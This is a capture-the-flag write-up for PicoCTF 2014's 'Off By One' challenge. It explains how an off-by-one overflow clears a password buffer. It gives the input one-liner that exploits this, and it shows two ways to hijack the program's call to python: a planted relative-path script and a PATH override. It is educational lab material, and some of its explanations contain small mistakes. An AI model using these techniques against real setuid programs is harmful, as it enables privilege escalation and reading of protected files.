###Off By One

This challenge comes from PicoCTF 2014. We are given a vulnerable C code in the directory ```/home/obo/```. Our goal is to cat ```flag.txt```, which is placed in the same directory.

The obvious mistake that the programmer has made is buffer overflow. Instead of using ```<```, the programmer used ```<=```, reading one additional index.
This vulnerability comes in handy for bypassing the password check. For now, let's talk about the first half of the ```main()```.
```
generate_hex_table();
...
printf("New password: ");
  fflush(stdout);
  read_password(stdin, new_password, sizeof(new_password));
  for (i = 0; i <= strlen(new_password); ++i) {
    int index = hex_table[(unsigned char) new_password[i]];
    if (index == -1) {
      printf("Invalid character: %c\n", new_password[i]);
      exit(1);
    }
    digits[index] = 1;
  }

  for (i = 0; i <= 16; ++i) {
    if (digits[i] == 0) {
      printf("Password is not complex enough: %d\n", i);
      return 1;
    }
  }
```
generate_hex_table() looks as follows
```
void generate_hex_table(void) {
  int i;
  for (i = 0; i <= 256; ++i) {
    hex_table[i] = -1;
  }

  for (i = 0; i <= 10; ++i) {
    hex_table['0' + i] = i;
  }

  for (i = 0; i <= 6; ++i) {
    hex_table['a' + i] = 10 + i;
  }

  for (i = 0; i <= 6; ++i) {
    hex_table['A' + i] = 10 + i;
  }

  // I don't know why, but I was getting errors, and this fixes it.
  hex_table[0] = 0;
}
```
What ```generate_hex_table()``` is supposed to do is to generate an int array that is used for password checking. First, all the array elements (including one-unit oveflow) is set to -1 to indicate invalid character.
Then, we see that the ASCII digits 0-9 as well as : that comes after ASCII 9) is set to 0 to 10 respectively, followed by ASCII lowercase alphabets
a to g set to 10 through to 16, followed by ASCII uppercase alphabets A to G set to 0 through to 16. 
The first for-loop of the main() checks whether each character of the string we input falls within these characters, and set digits[] array using 
```index = hex_table[(unsigned char) new_password[i]]```. To pass the second for-loop, all of the elements of digits[] must be set to 1.
So we know that the variable index has to be from 0 o 15. This is easy; we just give all the digits, as well as the alphabets a to f.
The second half of the program is password checking. 
```
  printf("Confirm old password: ");
  fflush(stdout);
  read_password(stdin, confirm_password, sizeof(confirm_password));
  if (strcmp(confirm_password, password) != 0) {
    printf("Old password is incorrect.\n");
    return 1;
  }
```
```confirm_password``` varible is the string we feed to the program. This is checked by the password stored and read from the password file. 
Now, there is no way we can guess or disclose the password: in fact, we don't have to do it. This is where the buffer overflow vulnerability comes in.
It turns out that in the stack, the variable stored after the int digits array is password. And when index = 16, we can set digits[16] = 1, which is actually this password string.
1 is an integer value (4 bytes), in hexadecimal equal to \x01\x00\x00\x00 (reversed for little-endian): this is handy because ASCII 0 follows \x01, which can be recognised as the null character
for this string! Note that to set index[16] = 1, we can supply g as one of the characters in the password, and this is exactly the <= mistake in the generate_hex_table() allows us to do.

Another mistake we can exploit is that the programmer called python to change the password rather than do it within the C code. 
There are a few ways we can exploit this.

-------------1--------------

We can go to the root directory and from there execute ```obo```. It is important to know that ```set_password.py``` is called relative to the program. Say we make a python file in the home directory with
identical name but has the following content

```
print open("cat /home/obo/flag.txt").read()
```
Then this would be the file executed by the program. So, in the root directory, enter the following in the command line
```
python -c 'print "abcdefg123456789\n\x01" ' | /home/obo/obo
```
Note that we have get to execute the program this way using Python because we want to pass integer (or hex) 1, not 1 as ASCII character. 

-------------2--------------

In the home directory, we can make a bash script named ```python``` with the following code inside
```
#!bin/sh
cat /home/obo/flag.txt
```
Make this executable and modify the $PATH variable
```
chmod +x python
export PATH=/home_users/pico*****:$PATH
```
We set the path as above because of the precedence - from left to right.

Also, in order to use the actual python command, we can call it as python2. So we just have to type in the command line
```
python2 -c "print 'abcdefg123456789\n\x01'"| /home/obo/obo
```

the flag is  ```watch_your_bounds```











